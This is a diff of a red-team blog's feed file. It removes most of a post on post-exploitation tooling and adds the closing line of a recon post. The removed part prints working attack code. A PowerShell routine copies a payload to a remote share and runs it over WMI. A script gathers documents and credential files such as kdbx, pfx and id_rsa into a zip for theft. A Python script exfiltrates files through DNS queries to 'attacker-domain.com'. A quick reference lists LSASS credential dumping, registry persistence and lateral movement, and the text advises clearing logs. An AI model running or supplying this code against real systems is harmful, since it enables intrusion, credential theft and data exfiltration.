-    </span><span class="nv">$remoteFull</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\</span><span class="nv">$Target</span><span class="s2">\</span><span class="nv">$RemotePath</span><span class="s2">\</span><span class="nv">$payloadName</span><span class="s2">"</span><span class="w">
-    </span><span class="nv">$remoteExec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$remoteFull</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s1">'\$'</span><span class="p">,</span><span class="w"> </span><span class="s1">':'</span><span class="w">
-
-    </span><span class="c"># Map drive if creds provided</span><span class="w">
-    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Credential</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="nv">$netPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\</span><span class="nv">$Target</span><span class="s2">\</span><span class="si">$(</span><span class="nv">$RemotePath</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">'\'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="si">)</span><span class="s2">"</span><span class="w">
-        </span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nv">$netPath</span><span class="w"> </span><span class="nv">$Credential</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">Password</span><span class="w"> </span><span class="nx">/user:</span><span class="err">$</span><span class="p">(</span><span class="nv">$Credential</span><span class="o">.</span><span class="nf">UserName</span><span class="p">)</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="c"># Copy payload</span><span class="w">
-    </span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$LocalPayload</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nv">$remoteFull</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Payload copied to: </span><span class="nv">$remoteFull</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-
-    </span><span class="c"># Execute via WMI</span><span class="w">
-    </span><span class="n">Invoke-WMIExec</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="nv">$Target</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="nv">$remoteExec</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Credential</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<h2 id="data-exfiltration">Data Exfiltration</h2>
-
-<h3 id="staged-file-collection">Staged File Collection</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># collect_data.ps1 - Collect interesting files for exfil</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Invoke-DataCollection</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$OutputPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">TEMP</span><span class="s2">\collection"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$OutputPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
-
-    </span><span class="c"># Define targets</span><span class="w">
-    </span><span class="nv">$targets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
-        </span><span class="s2">"Documents"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s2">"*.docx"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.xlsx"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.pdf"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.txt"</span><span class="p">)</span><span class="w">
-        </span><span class="s2">"Credentials"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s2">"*.kdbx"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.key"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.pfx"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.p12"</span><span class="p">,</span><span class="w"> </span><span class="s2">"id_rsa*"</span><span class="p">)</span><span class="w">
-        </span><span class="s2">"Configs"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s2">"*.config"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.xml"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.ini"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.conf"</span><span class="p">)</span><span class="w">
-        </span><span class="s2">"Code"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s2">"*.ps1"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.py"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.sh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*.bat"</span><span class="p">)</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="nv">$searchPaths</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Desktop"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Documents"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Downloads"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"C:\Users\*\Desktop"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"C:\Shares"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$category</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$targets</span><span class="o">.</span><span class="nf">Keys</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="nv">$categoryPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$OutputPath</span><span class="w"> </span><span class="nv">$category</span><span class="w">
-        </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$categoryPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
-
-        </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$searchPath</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$searchPaths</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-            </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$pattern</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$targets</span><span class="p">[</span><span class="nv">$category</span><span class="p">])</span><span class="w"> </span><span class="p">{</span><span class="w">
-                </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$searchPath</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="nv">$pattern</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w">
-                    </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="n">MB</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="c"># Skip large files</span><span class="w">
-                    </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
-                        </span><span class="n">Copy-Item</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nv">$categoryPath</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
-                    </span><span class="p">}</span><span class="w">
-            </span><span class="p">}</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="c"># Compress</span><span class="w">
-    </span><span class="nv">$zipPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$OutputPath</span><span class="s2">.zip"</span><span class="w">
-    </span><span class="n">Compress-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$OutputPath</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="nv">$zipPath</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
-
-    </span><span class="c"># Cleanup folder</span><span class="w">
-    </span><span class="n">Remove-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$OutputPath</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Collection complete: </span><span class="nv">$zipPath</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[*] Size: </span><span class="si">$(</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nv">$zipPath</span><span class="p">)</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">1MB</span><span class="p">)</span><span class="w"> </span><span class="n">MB</span><span class="s2">"
-
-    return </span><span class="nv">$zipPath</span><span class="s2">
-}
-</span></code></pre></div></div>
-
-<h3 id="dns-exfiltration">DNS Exfiltration</h3>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="s">"""
-dns_exfil.py - Exfiltrate data via DNS queries
-For when HTTP/HTTPS is blocked but DNS is allowed
-"""</span>
-
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="k">def</span> <span class="nf">chunk_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">chunk_size</span><span class="o">=</span><span class="mi">60</span><span class="p">):</span>
-    <span class="s">"""Split data into DNS-safe chunks"""</span>
-    <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b32encode</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">rstrip</span><span class="p">(</span><span class="s">'='</span><span class="p">).</span><span class="n">lower</span><span class="p">()</span>
-    <span class="k">return</span> <span class="p">[</span><span class="n">encoded</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">chunk_size</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded</span><span class="p">),</span> <span class="n">chunk_size</span><span class="p">)]</span>
-
-<span class="k">def</span> <span class="nf">exfil_dns</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">dns_server</span><span class="o">=</span><span class="s">"8.8.8.8"</span><span class="p">):</span>
-    <span class="s">"""Exfiltrate file via DNS TXT queries"""</span>
-    <span class="kn">import</span> <span class="nn">dns.resolver</span>
-
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
-
-    <span class="n">chunks</span> <span class="o">=</span> <span class="n">chunk_data</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-    <span class="n">total</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
-
-    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Exfiltrating </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes in </span><span class="si">{</span><span class="n">total</span><span class="si">}</span><span class="s"> chunks"</span><span class="p">)</span>
-
-    <span class="n">resolver</span> <span class="o">=</span> <span class="n">dns</span><span class="p">.</span><span class="n">resolver</span><span class="p">.</span><span class="n">Resolver</span><span class="p">()</span>
-    <span class="n">resolver</span><span class="p">.</span><span class="n">nameservers</span> <span class="o">=</span> <span class="p">[</span><span class="n">dns_server</span><span class="p">]</span>
-
-    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">chunks</span><span class="p">):</span>
-        <span class="c1"># Format: chunk.seq-total.domain
-</span>        <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">chunk</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">total</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s">"</span>
-
-        <span class="k">try</span><span class="p">:</span>
-            <span class="c1"># Query doesn't need to succeed - DNS server logs the request
-</span>            <span class="n">resolver</span><span class="p">.</span><span class="n">resolve</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>
-        <span class="k">except</span><span class="p">:</span>
-            <span class="k">pass</span>
-
-        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Progress: </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">total</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-
-    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Exfiltration complete"</span><span class="p">)</span>
-
-<span class="c1"># Usage: python3 dns_exfil.py secret.txt attacker-domain.com
-</span></code></pre></div></div>
-
-<hr />
-
-<h2 id="quick-reference">Quick Reference</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Situational awareness</span>
-powershell <span class="nt">-ep</span> bypass <span class="nt">-c</span> <span class="s2">"IEX(sitaware.ps1)"</span>
-
-<span class="c"># Dump creds (LSASS)</span>
-powershell <span class="nt">-c</span> <span class="s2">"Dump-LsassComsvcs"</span>
-
-<span class="c"># Persistence (registry)</span>
-powershell <span class="nt">-c</span> <span class="s2">"Set-RegistryPersistence -PayloadPath 'C:</span><span class="se">\b</span><span class="s2">eacon.exe'"</span>
-
-<span class="c"># Lateral movement (WMI)</span>
-powershell <span class="nt">-c</span> <span class="s2">"Invoke-WMIExec -Target DC01 -Command 'whoami &gt; C:</span><span class="se">\t</span><span class="s2">est.txt'"</span>
-
-<span class="c"># Data collection</span>
-powershell <span class="nt">-c</span> <span class="s2">"Invoke-DataCollection"</span>
-</code></pre></div></div>
-
-<p>These scripts are starting points. Customize them for your environment, add error handling, implement OPSEC considerations (like clearing logs, using encrypted channels), and always test in a lab before using on real engagements.</p>
-
-<p>The difference between a good red teamer and a great one is the quality of their toolkit.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="post-exploitation" /><category term="persistence" /><category term="lateral-movement" /><category term="red-team" /><category term="powershell" /><summary type="html"><![CDATA[Scripts for maintaining access - credential harvesting, persistence mechanisms, lateral movement, and data exfiltration techniques.]]></summary></entry></feed>
+<p>Recon isn’t glamorous, but it’s where engagements are won.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="reconnaissance" /><category term="automation" /><category term="bash" /><category term="osint" /><category term="bug-bounty" /><summary type="html"><![CDATA[Automated recon workflow - subdomain enumeration, port scanning, screenshots, tech fingerprinting, and cloud asset discovery.]]></summary></entry></feed>
